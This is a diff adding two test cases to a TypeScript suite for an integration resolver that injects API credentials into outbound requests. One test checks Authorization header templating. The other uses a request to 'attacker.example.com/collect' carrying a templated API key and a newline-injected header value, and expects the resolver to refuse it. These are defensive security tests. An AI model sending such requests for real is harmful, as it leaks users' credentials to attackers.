@@ -796,6 +796,48 @@ describe("LocalIntegrationResolver", () => {
     });
   });
 
+  it("repairs `Bearer{{field}}` in a kept Authorization header, as the platform and the sidecar do", async () => {
+    const calls: { url: string; init: RequestInit }[] = [];
+    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
+    const integ = makePackage("@acme/api", "1.0.0", "integration", {
+      "integration.json": JSON.stringify(
+        apiKeyIntegrationManifest("@acme/api", {
+          headerName: "Authorization",
+          headerPrefix: "Bearer ",
+          allowServerOverride: true,
+        }).integration,
+      ),
+    });
+    const resolver = new LocalIntegrationResolver({
+      resolveHost: async () => ["203.0.113.7"],
+      creds: {
+        version: 1,
+        integrations: { "@acme/api": { fields: { api_key: "server", alt: "other" } } },
+      },
+      fetch: ((url: string, init: RequestInit) => {
+        calls.push({ url, init });
+        return Promise.resolve(new Response("{}", { status: 200 }));
+      }) as typeof fetch,
+    });
+    const tools = await resolver.resolve(
+      [{ name: "@acme/api", version: "^1" }],
+      makeBundle(root, [integ]),
+    );
+    const { ctx } = makeCtx();
+    await tools[0]!.execute(
+      {
+        method: "GET",
+        target: "https://api.acme.com/v1/me",
+        // Not the injected field: the caller's value is what must reach the wire.
+        headers: { authorization: "Bearer{{alt}}" },
+      },
+      ctx,
+    );
+    expect(Object.fromEntries(new Headers(calls[0]!.init.headers))).toEqual({
+      authorization: "Bearer other",
+    });
+  });
+
   it("honours an explicit injection override from the creds file", async () => {
     const calls: { url: string; init: RequestInit }[] = [];
     const root = makePackage("@acme/agent", "1.0.0", "agent", {});
@@ -1161,6 +1203,36 @@ describe("LocalIntegrationResolver — SSRF + redirect hardening (newly added on
       ),
     ).rejects.toMatchObject({ code: "RESOLVER_CREDENTIAL_EXFIL_BLOCKED" });
     expect(fetched).toBe(0); // refused before any outbound bytes
+  });
+
+  it("refuses a caller header that is no HTTP field value ahead of the URL policy", async () => {
+    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
+    const bundle = makeBundle(root, [
+      makePackage("@acme/api", "1.0.0", "integration", {
+        "integration.json": JSON.stringify(
+          apiKeyIntegrationManifest("@acme/api", { allowAllUris: true, authorizedUris: [] })
+            .integration,
+        ),
+      }),
+    ]);
+    const resolver = new LocalIntegrationResolver({
+      resolveHost: async () => ["203.0.113.7"],
+      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
+      fetch: (() => Promise.resolve(new Response("{}"))) as unknown as typeof fetch,
+    });
+    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
+    await expect(
+      tools[0]!.execute(
+        {
+          method: "POST",
+          target: "https://attacker.example.com/collect",
+          headers: { "X-Bad": "a\nb" },
+          // A credential and no allowlist: alone, RESOLVER_CREDENTIAL_EXFIL_BLOCKED.
+          body: "key={{api_key}}",
+        },
+        makeCtx().ctx,
+      ),
+    ).rejects.toMatchObject({ code: "RESOLVER_HEADER_INVALID" });
   });
 
   it("refuses a templated secret to another endpoint on a URL-valued field's origin", async () => {
